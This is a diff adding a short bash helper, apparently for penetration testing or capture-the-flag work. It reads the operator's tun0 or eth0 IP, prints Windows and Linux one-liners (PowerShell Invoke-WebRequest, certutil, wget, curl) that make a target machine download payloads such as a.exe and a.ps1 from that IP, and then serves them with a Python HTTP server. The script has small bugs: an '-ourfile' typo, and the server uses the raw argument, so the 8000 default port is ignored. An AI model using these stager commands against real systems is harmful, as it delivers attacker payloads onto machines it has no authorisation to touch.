@@ -1,0 +1,48 @@
+#!/bin/bash
+
+#----------------------------------------
+# HOW TO USE?
+# Just up or up 8004
+#----------------------------------------
+
+# Color Options
+FRED='\033[0;31m'
+FCYAN='\e[36m'
+BNC='\033[0m' # No Color
+
+# Get IP
+if ifconfig tun0 > /dev/null 2>&1;then
+    IP=$(ifconfig tun0 | grep "inet " | cut -d " " -f 10)    
+else
+    IP=$(ifconfig eth0 | grep "inet " | cut -d " " -f 10)
+fi
+
+# Get PORT
+if [ -z $1 ]
+then 
+    PORT=8000
+else
+    PORT=$1
+fi
+
+# Output
+
+# Windows
+echo -e "${FCYAN}Windows:${BNC}"
+
+echo -e "${FRED}[+]${BNC} powershell.exe Invoke-Webrequest -uri http://${IP}:${PORT}/a.exe -ourfile C:\TEMP\a.exe"
+echo -e "${FRED}[+]${BNC} certutil -URLCache -f http://${IP}:${PORT}/a.ps1 a.ps1"
+echo -e "${FRED}[+]${BNC} powershell.exe wget http://${IP}:${PORT}/a.exe -outfile a.exe"
+echo -e "${FRED}[+]${BNC} curl http://${IP}:${PORT}/a.exe --output a.exe"
+
+
+# Linux
+echo -e "${FCYAN}Linux:${BNC}"
+
+echo -e "${FRED}[+]${BNC} wget http://${IP}:${PORT}/a.sh"
+echo -e "${FRED}[+]${BNC} curl http://${IP}:${PORT}/a.sh --output a.sh"
+
+echo -e ""
+
+# Up Port HTTP Server
+python -m SimpleHTTPServer $1
